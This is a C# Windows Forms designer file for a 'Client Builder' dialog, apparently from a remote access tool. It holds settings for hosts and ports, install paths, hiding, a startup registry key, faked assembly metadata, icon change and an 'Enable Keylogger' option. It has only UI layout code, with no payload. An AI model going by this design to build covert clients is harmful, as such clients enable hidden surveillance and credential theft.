            this.txtExamplePath.Location = new System.Drawing.Point(20, 234);
            this.txtExamplePath.Name = "txtExamplePath";
            this.txtExamplePath.ReadOnly = true;
            this.txtExamplePath.Size = new System.Drawing.Size(363, 22);
            this.txtExamplePath.TabIndex = 13;
            this.txtExamplePath.TabStop = false;
            // 
            // assemblyPage
            // 
            this.assemblyPage.BackColor = System.Drawing.SystemColors.Control;
            this.assemblyPage.Controls.Add(this.line8);
            this.assemblyPage.Controls.Add(this.label11);
            this.assemblyPage.Controls.Add(this.chkChangeAsmInfo);
            this.assemblyPage.Controls.Add(this.txtFileVersion);
            this.assemblyPage.Controls.Add(this.lblProductName);
            this.assemblyPage.Controls.Add(this.lblFileVersion);
            this.assemblyPage.Controls.Add(this.txtProductName);
            this.assemblyPage.Controls.Add(this.txtProductVersion);
            this.assemblyPage.Controls.Add(this.lblDescription);
            this.assemblyPage.Controls.Add(this.lblProductVersion);
            this.assemblyPage.Controls.Add(this.txtDescription);
            this.assemblyPage.Controls.Add(this.txtOriginalFilename);
            this.assemblyPage.Controls.Add(this.lblCompanyName);
            this.assemblyPage.Controls.Add(this.lblOriginalFilename);
            this.assemblyPage.Controls.Add(this.txtCompanyName);
            this.assemblyPage.Controls.Add(this.txtTrademarks);
            this.assemblyPage.Controls.Add(this.lblCopyright);
            this.assemblyPage.Controls.Add(this.lblTrademarks);
            this.assemblyPage.Controls.Add(this.txtCopyright);
            this.assemblyPage.Location = new System.Drawing.Point(140, 4);
            this.assemblyPage.Name = "assemblyPage";
            this.assemblyPage.Size = new System.Drawing.Size(391, 370);
            this.assemblyPage.TabIndex = 2;
            this.assemblyPage.Text = "Assembly Information";
            // 
            // line8
            // 
            this.line8.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line8.Location = new System.Drawing.Point(122, 5);
            this.line8.Name = "line8";
            this.line8.Size = new System.Drawing.Size(261, 13);
            this.line8.TabIndex = 36;
            this.line8.TabStop = false;
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(6, 5);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(118, 13);
            this.label11.TabIndex = 35;
            this.label11.Text = "Assembly Information";
            // 
            // chkChangeAsmInfo
            // 
            this.chkChangeAsmInfo.AutoSize = true;
            this.chkChangeAsmInfo.Location = new System.Drawing.Point(20, 21);
            this.chkChangeAsmInfo.Name = "chkChangeAsmInfo";
            this.chkChangeAsmInfo.Size = new System.Drawing.Size(180, 17);
            this.chkChangeAsmInfo.TabIndex = 0;
            this.chkChangeAsmInfo.Text = "Change Assembly Information";
            this.chkChangeAsmInfo.UseVisualStyleBackColor = true;
            this.chkChangeAsmInfo.CheckedChanged += new System.EventHandler(this.chkChangeAsmInfo_CheckedChanged);
            // 
            // txtFileVersion
            // 
            this.txtFileVersion.Location = new System.Drawing.Point(182, 240);
            this.txtFileVersion.Name = "txtFileVersion";
            this.txtFileVersion.Size = new System.Drawing.Size(201, 22);
            this.txtFileVersion.TabIndex = 16;
            this.txtFileVersion.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblProductName
            // 
            this.lblProductName.AutoSize = true;
            this.lblProductName.Location = new System.Drawing.Point(17, 47);
            this.lblProductName.Name = "lblProductName";
            this.lblProductName.Size = new System.Drawing.Size(82, 13);
            this.lblProductName.TabIndex = 1;
            this.lblProductName.Text = "Product Name:";
            // 
            // lblFileVersion
            // 
            this.lblFileVersion.AutoSize = true;
            this.lblFileVersion.Location = new System.Drawing.Point(17, 243);
            this.lblFileVersion.Name = "lblFileVersion";
            this.lblFileVersion.Size = new System.Drawing.Size(70, 13);
            this.lblFileVersion.TabIndex = 15;
            this.lblFileVersion.Text = "File Version:";
            // 
            // txtProductName
            // 
            this.txtProductName.Location = new System.Drawing.Point(182, 44);
            this.txtProductName.Name = "txtProductName";
            this.txtProductName.Size = new System.Drawing.Size(201, 22);
            this.txtProductName.TabIndex = 2;
            this.txtProductName.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // txtProductVersion
            // 
            this.txtProductVersion.Location = new System.Drawing.Point(182, 212);
            this.txtProductVersion.Name = "txtProductVersion";
            this.txtProductVersion.Size = new System.Drawing.Size(201, 22);
            this.txtProductVersion.TabIndex = 14;
            this.txtProductVersion.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblDescription
            // 
            this.lblDescription.AutoSize = true;
            this.lblDescription.Location = new System.Drawing.Point(17, 75);
            this.lblDescription.Name = "lblDescription";
            this.lblDescription.Size = new System.Drawing.Size(69, 13);
            this.lblDescription.TabIndex = 3;
            this.lblDescription.Text = "Description:";
            // 
            // lblProductVersion
            // 
            this.lblProductVersion.AutoSize = true;
            this.lblProductVersion.Location = new System.Drawing.Point(17, 215);
            this.lblProductVersion.Name = "lblProductVersion";
            this.lblProductVersion.Size = new System.Drawing.Size(92, 13);
            this.lblProductVersion.TabIndex = 13;
            this.lblProductVersion.Text = "Product Version:";
            // 
            // txtDescription
            // 
            this.txtDescription.Location = new System.Drawing.Point(182, 72);
            this.txtDescription.Name = "txtDescription";
            this.txtDescription.Size = new System.Drawing.Size(201, 22);
            this.txtDescription.TabIndex = 4;
            this.txtDescription.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // txtOriginalFilename
            // 
            this.txtOriginalFilename.Location = new System.Drawing.Point(182, 184);
            this.txtOriginalFilename.Name = "txtOriginalFilename";
            this.txtOriginalFilename.Size = new System.Drawing.Size(201, 22);
            this.txtOriginalFilename.TabIndex = 12;
            this.txtOriginalFilename.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblCompanyName
            // 
            this.lblCompanyName.AutoSize = true;
            this.lblCompanyName.Location = new System.Drawing.Point(17, 103);
            this.lblCompanyName.Name = "lblCompanyName";
            this.lblCompanyName.Size = new System.Drawing.Size(90, 13);
            this.lblCompanyName.TabIndex = 5;
            this.lblCompanyName.Text = "Company Name:";
            // 
            // lblOriginalFilename
            // 
            this.lblOriginalFilename.AutoSize = true;
            this.lblOriginalFilename.Location = new System.Drawing.Point(17, 187);
            this.lblOriginalFilename.Name = "lblOriginalFilename";
            this.lblOriginalFilename.Size = new System.Drawing.Size(101, 13);
            this.lblOriginalFilename.TabIndex = 11;
            this.lblOriginalFilename.Text = "Original Filename:";
            // 
            // txtCompanyName
            // 
            this.txtCompanyName.Location = new System.Drawing.Point(182, 100);
            this.txtCompanyName.Name = "txtCompanyName";
            this.txtCompanyName.Size = new System.Drawing.Size(201, 22);
            this.txtCompanyName.TabIndex = 6;
            this.txtCompanyName.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // txtTrademarks
            // 
            this.txtTrademarks.Location = new System.Drawing.Point(182, 156);
            this.txtTrademarks.Name = "txtTrademarks";
            this.txtTrademarks.Size = new System.Drawing.Size(201, 22);
            this.txtTrademarks.TabIndex = 10;
            this.txtTrademarks.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // lblCopyright
            // 
            this.lblCopyright.AutoSize = true;
            this.lblCopyright.Location = new System.Drawing.Point(17, 131);
            this.lblCopyright.Name = "lblCopyright";
            this.lblCopyright.Size = new System.Drawing.Size(61, 13);
            this.lblCopyright.TabIndex = 7;
            this.lblCopyright.Text = "Copyright:";
            // 
            // lblTrademarks
            // 
            this.lblTrademarks.AutoSize = true;
            this.lblTrademarks.Location = new System.Drawing.Point(17, 159);
            this.lblTrademarks.Name = "lblTrademarks";
            this.lblTrademarks.Size = new System.Drawing.Size(68, 13);
            this.lblTrademarks.TabIndex = 9;
            this.lblTrademarks.Text = "Trademarks:";
            // 
            // txtCopyright
            // 
            this.txtCopyright.Location = new System.Drawing.Point(182, 128);
            this.txtCopyright.Name = "txtCopyright";
            this.txtCopyright.Size = new System.Drawing.Size(201, 22);
            this.txtCopyright.TabIndex = 8;
            this.txtCopyright.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // additionalTab
            // 
            this.additionalTab.BackColor = System.Drawing.SystemColors.Control;
            this.additionalTab.Controls.Add(this.line10);
            this.additionalTab.Controls.Add(this.label14);
            this.additionalTab.Controls.Add(this.label13);
            this.additionalTab.Controls.Add(this.line9);
            this.additionalTab.Controls.Add(this.label12);
            this.additionalTab.Controls.Add(this.chkKeylogger);
            this.additionalTab.Controls.Add(this.chkIconChange);
            this.additionalTab.Location = new System.Drawing.Point(140, 4);
            this.additionalTab.Name = "additionalTab";
            this.additionalTab.Size = new System.Drawing.Size(391, 370);
            this.additionalTab.TabIndex = 3;
            this.additionalTab.Text = "Additional Settings";
            // 
            // line10
            // 
            this.line10.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line10.Location = new System.Drawing.Point(83, 77);
            this.line10.Name = "line10";
            this.line10.Size = new System.Drawing.Size(300, 13);
            this.line10.TabIndex = 41;
            this.line10.TabStop = false;
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(6, 77);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(80, 13);
            this.label14.TabIndex = 3;
            this.label14.Text = "Miscellaneous";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(20, 21);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(317, 13);
            this.label13.TabIndex = 1;
            this.label13.Text = "You will be asked to choose the icon when building a client.";
            // 
            // line9
            // 
            this.line9.LineAlignment = xServer.Controls.Line.Alignment.Horizontal;
            this.line9.Location = new System.Drawing.Point(33, 5);
            this.line9.Name = "line9";
            this.line9.Size = new System.Drawing.Size(350, 13);
            this.line9.TabIndex = 38;
            this.line9.TabStop = false;
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(6, 5);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(29, 13);
            this.label12.TabIndex = 0;
            this.label12.Text = "Icon";
            // 
            // chkKeylogger
            // 
            this.chkKeylogger.AutoSize = true;
            this.chkKeylogger.Location = new System.Drawing.Point(23, 96);
            this.chkKeylogger.Name = "chkKeylogger";
            this.chkKeylogger.Size = new System.Drawing.Size(115, 17);
            this.chkKeylogger.TabIndex = 4;
            this.chkKeylogger.Text = "Enable Keylogger";
            this.chkKeylogger.UseVisualStyleBackColor = true;
            this.chkKeylogger.CheckedChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // FrmBuilder
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.Control;
            this.ClientSize = new System.Drawing.Size(535, 419);
            this.Controls.Add(this.builderTabs);
            this.Controls.Add(this.btnBuild);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "FrmBuilder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Client Builder";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmBuilder_FormClosing);
            this.Load += new System.EventHandler(this.FrmBuilder_Load);
            ((System.ComponentModel.ISupportInitialize)(this.picUAC2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.picUAC1)).EndInit();
            this.ctxtMenuHosts.ResumeLayout(false);
            this.builderTabs.ResumeLayout(false);
            this.generalPage.ResumeLayout(false);
            this.generalPage.PerformLayout();
            this.connectionPage.ResumeLayout(false);
            this.connectionPage.PerformLayout();
            this.installationPage.ResumeLayout(false);
            this.installationPage.PerformLayout();
            this.assemblyPage.ResumeLayout(false);
            this.assemblyPage.PerformLayout();
            this.additionalTab.ResumeLayout(false);
            this.additionalTab.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.CheckBox chkShowPass;
        private System.Windows.Forms.TextBox txtPassword;
        private System.Windows.Forms.Label lblPassword;
        private System.Windows.Forms.TextBox txtPort;
        private System.Windows.Forms.Label lblPort;
        private System.Windows.Forms.TextBox txtHost;
        private System.Windows.Forms.Label lblHost;
        private System.Windows.Forms.TextBox txtDelay;
        private System.Windows.Forms.Label lblDelay;
        private System.Windows.Forms.CheckBox chkInstall;
        private System.Windows.Forms.TextBox txtInstallname;
        private System.Windows.Forms.Label lblInstallname;
        private System.Windows.Forms.TextBox txtMutex;
        private System.Windows.Forms.Label lblMutex;
        private System.Windows.Forms.Label lblExtension;
        private System.Windows.Forms.Label lblInstallpath;
        private System.Windows.Forms.RadioButton rbAppdata;
        private System.Windows.Forms.TextBox txtInstallsub;
        private System.Windows.Forms.Label lblInstallsub;
        private System.Windows.Forms.Label lblExamplePath;
        private System.Windows.Forms.TextBox txtExamplePath;
        private System.Windows.Forms.Button btnMutex;
        private System.Windows.Forms.CheckBox chkHide;
        private System.Windows.Forms.TextBox txtRegistryKeyName;
        private System.Windows.Forms.Label lblRegistryKeyName;
        private System.Windows.Forms.CheckBox chkStartup;
        private System.Windows.Forms.Button btnBuild;
        private System.Windows.Forms.Label lblMS;
        private System.Windows.Forms.RadioButton rbSystem;
        private System.Windows.Forms.RadioButton rbProgramFiles;
        private System.Windows.Forms.PictureBox picUAC1;
        private System.Windows.Forms.PictureBox picUAC2;
        private System.Windows.Forms.ToolTip tooltip;
        private System.Windows.Forms.CheckBox chkIconChange;
        private System.Windows.Forms.TextBox txtDescription;
        private System.Windows.Forms.Label lblDescription;
        private System.Windows.Forms.TextBox txtProductName;
        private System.Windows.Forms.Label lblProductName;
        private System.Windows.Forms.TextBox txtOriginalFilename;
        private System.Windows.Forms.Label lblOriginalFilename;
        private System.Windows.Forms.TextBox txtTrademarks;
        private System.Windows.Forms.Label lblTrademarks;
        private System.Windows.Forms.TextBox txtCopyright;
        private System.Windows.Forms.Label lblCopyright;
        private System.Windows.Forms.TextBox txtCompanyName;
        private System.Windows.Forms.Label lblCompanyName;
        private System.Windows.Forms.TextBox txtFileVersion;
        private System.Windows.Forms.Label lblFileVersion;
        private System.Windows.Forms.TextBox txtProductVersion;
        private System.Windows.Forms.Label lblProductVersion;
        private System.Windows.Forms.CheckBox chkChangeAsmInfo;
        private System.Windows.Forms.CheckBox chkKeylogger;
        private Controls.DotNetBarTabControl builderTabs;
        private System.Windows.Forms.TabPage connectionPage;
        private System.Windows.Forms.TabPage installationPage;
        private System.Windows.Forms.TabPage assemblyPage;
        private System.Windows.Forms.TabPage additionalTab;
        private System.Windows.Forms.ListBox lstHosts;
        private System.Windows.Forms.ContextMenuStrip ctxtMenuHosts;
        private System.Windows.Forms.Button btnAddHost;
        private System.Windows.Forms.ToolStripMenuItem ctxtRemove;
        private Controls.Line line1;
        private System.Windows.Forms.Label label1;
        private Controls.Line line3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.Label label3;
        private Controls.Line line2;
        private System.Windows.Forms.Label label2;
        private Controls.Line line4;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TabPage generalPage;
        private System.Windows.Forms.TextBox txtTag;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Label lblTag;
        private Controls.Line line5;
        private System.Windows.Forms.Label label6;
        private Controls.Line line6;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.Label label9;
        private Controls.Line line7;
        private System.Windows.Forms.Label label10;
        private Controls.Line line8;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.Label label13;
        private Controls.Line line9;
        private System.Windows.Forms.Label label12;
        private Controls.Line line10;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.ToolStripMenuItem ctxtClear;
    }
}
